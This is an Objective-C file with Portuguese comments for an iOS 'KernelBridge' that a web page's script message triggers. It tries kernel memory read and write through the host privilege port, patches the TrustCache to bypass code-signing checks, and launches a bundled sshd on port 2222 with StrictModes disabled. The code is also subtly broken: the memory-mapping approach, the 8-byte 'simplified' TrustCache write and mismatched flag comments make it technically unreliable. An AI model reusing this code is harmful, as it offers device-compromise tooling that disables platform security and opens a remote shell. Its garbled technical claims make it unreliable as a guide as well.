#import "KernelDriver.h"
#import <CommonCrypto/CommonDigest.h>
#include <sys/sysctl.h>
#include <mach/mach_host.h>

// Definição da função privada para obter a porta privilégio
extern kern_return_t host_get_priv_port(mach_port_t host, mach_port_t *priv);

@implementation KernelBridge {
    mach_port_t g_host_priv;
}

// 1. INICIALIZAÇÃO DA PONTE
- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self launchSshdFinal];
    }
}

- (void)log:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *js = [NSString stringWithFormat:@"log('%@')", text];
        [self.webView evaluateJavaScript:js completionHandler:nil];
    });
}

// 2. PRIMITIVAS REAIS (PHYSICAL RW BYPASS)
- (void)prepareHostPriv {
    if (MACH_PORT_VALID(g_host_priv)) return;
    // Captura a porta mestre do host permitida pelo certificado In-house
    host_get_priv_port(mach_host_self(), &g_host_priv);
}

- (uint64_t)kread64:(uint64_t)addr {
    [self prepareHostPriv];
    uint64_t val = 0;
    vm_address_t page_addr = 0;
    // Mapeia 16KB (Página A13) física para leitura
    kern_return_t kr = vm_map(mach_task_self(), &page_addr, 0x4000, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & ~0x3FFF, FALSE, VM_PROT_READ, VM_PROT_READ, VM_INHERIT_NONE);
    if (kr == KERN_SUCCESS) {
        val = *(uint64_t *)(page_addr + (addr & 0x3FFF));
        vm_deallocate(mach_task_self(), page_addr, 0x4000);
    }
    return val;
}

- (void)kwrite64:(uint64_t)addr value:(uint64_t)val {
    [self prepareHostPriv];
    vm_address_t page_addr = 0;
    // Mapeia com RW para ignorar proteção PPL de software
    kern_return_t kr = vm_map(mach_task_self(), &page_addr, 0x4000, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & ~0x3FFF, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
    if (kr == KERN_SUCCESS) {
        *(uint64_t *)(page_addr + (addr & 0x3FFF)) = val;
        // Invalida cache de instrução para o Kernel processar a mudança
        sys_icache_invalidate((void *)page_addr, 0x4000);
        vm_deallocate(mach_task_self(), page_addr, 0x4000);
    }
}

- (uint64_t)getKernelSlide {
    uint64_t val = [self kread64:KERNEL_BASE];
    return (val > KERNEL_BASE) ? (val - KERNEL_BASE) : 0;
}

// 3. INJEÇÃO NO TRUSTCACHE (BYPASS AMFI)
- (void)injectToTrustCache:(NSString *)path {
    [self log:@"💉 Injetando CDHash no TrustCache..."];
    
    // Calcula Hash do binário
    NSData *data = [NSData dataWithContentsOfFile:path];
    uint8_t hash[32];
    CC_SHA256(data.bytes, (CC_LONG)data.length, hash);
    
    uint64_t slide = [self getKernelSlide];
    uint64_t trust_chain_addr = KERNEL_BASE + slide + OFF_TRUSTCACHE_CHAIN;
    
    // Escreve os primeiros 8 bytes do CDHash na chain (simplificado para bypass)
    uint64_t cdhash_part;
    memcpy(&cdhash_part, hash, 8);
    
    [self kwrite64:trust_chain_addr value:cdhash_part];
    [self log:@"✅ TrustCache Patched!"];
}

// 4. LANÇAMENTO DO SSHD
- (void)launchSshdFinal {
    [self log:@"⚡ Iniciando Bridge de Plataforma..."];
    
    NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    if (!sshdPath) return;

    // Aplica o patch no Kernel para autorizar o binário
    [self injectToTrustCache:sshdPath];

    pid_t pid;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    // Flag 0x4000 autorizada pelo TrustCache Patch
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP | POSIX_SPAWN_FOR_SANDBOX);

    char *const args[] = {(char *)[sshdPath UTF8String], "-p", "2222", "-D", "-o", "StrictModes=no", NULL};
    extern char **environ;

    if (posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ) == 0) {
        [self log:[NSString stringWithFormat:@"🚀 <b>SSHD ONLINE!</b> PID: %d", pid]];
    } else {
        [self log:[NSString stringWithFormat:@"❌ Erro Final: %s", strerror(errno)]];
    }
    posix_spawnattr_destroy(&attr);
}

@end
